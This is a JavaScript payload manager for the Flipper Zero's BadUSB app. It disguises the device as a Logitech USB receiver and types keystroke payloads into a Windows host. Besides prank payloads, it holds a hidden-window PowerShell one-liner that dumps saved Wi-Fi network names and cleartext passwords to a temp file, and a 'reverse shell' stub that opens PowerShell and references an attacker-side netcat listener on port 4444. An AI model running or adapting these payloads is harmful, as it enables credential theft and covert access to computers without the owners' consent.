// Flipper Zero BadUSB Payload Manager
// Drop into: SD Card/apps/Scripts/badusb/
// Provides: payload selection, execution, and basic obfuscation

let badusb = require("badusb");
let dialog = require("dialog");
let storage = require("storage");
let eventLoop = require("event_loop");
let gui = require("gui");
let notify = require("notification");

// Payload library - each payload is a function that types a sequence
let payloads = {
    "hello_world": function() {
        badusb.println("Hello from Flipper Zero!");
    },
    "rickroll": function() {
        badusb.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    },
    "fake_update": function() {
        badusb.press("GUI", "r");
        delay(500);
        badusb.type("ms-settings:windowsupdate");
        badusb.press("ENTER");
        delay(2000);
        badusb.println("Installing updates... 0%");
        for (let i = 1; i <= 10; i++) {
            delay(3000);
            badusb.println("Installing updates... " + (i * 10) + "%");
        }
        badusb.println("Update failed. Please contact IT support.");
    },
    "wifi_password_dump": function() {
        badusb.press("GUI", "r");
        delay(500);
        badusb.type("powershell -WindowStyle Hidden -Command \"netsh wlan show profiles | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{'SSID: ' + $name + ' PASS: ' + $pass} | Out-File -FilePath $env:TEMP\\wifi.txt\"");
        badusb.press("ENTER");
        delay(3000);
    },
    "reverse_shell_hint": function() {
        badusb.press("GUI", "r");
        delay(500);
        badusb.type("powershell");
        badusb.press("ENTER");
        delay(1000);
        badusb.println("# Run: nc -lvnp 4444 on attacker machine");
        badusb.println("# Then execute reverse shell here");
    }
};

// GUI menu for payload selection
function showMenu() {
    let items = [];
    for (let key in payloads) {
        items.push(key);
    }
    
    let selected = dialog.select("BadUSB Payload Manager", items);
    if (selected !== undefined) {
        executePayload(selected);
    }
}

// Execute selected payload with safety checks
function executePayload(name) {
    notify.blink("blue", "short");
    print("[+] Preparing payload: " + name);
    
    // Setup BadUSB
    badusb.setup({
        vid: 0x046D,
        pid: 0xC52B,
        manufacturer_name: "Logitech",
        product_name: "USB Receiver",
        layout_path: "/ext/apps_assets/badusb/en-us.kl"
    });
    
    delay(1000);
    
    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("[+] USB connected. Executing...");
        
        // Run the payload
        payloads[name]();
        
        notify.success();
        print("[+] Payload executed: " + name);
    } else {
        notify.error();
        print("[-] USB not connected. Aborting.");
    }
    
    badusb.quit();
}

// Main entry
print("=== Flipper Zero BadUSB Payload Manager ===");
print("Available payloads: " + Object.keys(payloads).length);

showMenu();

print("=== Done ===");
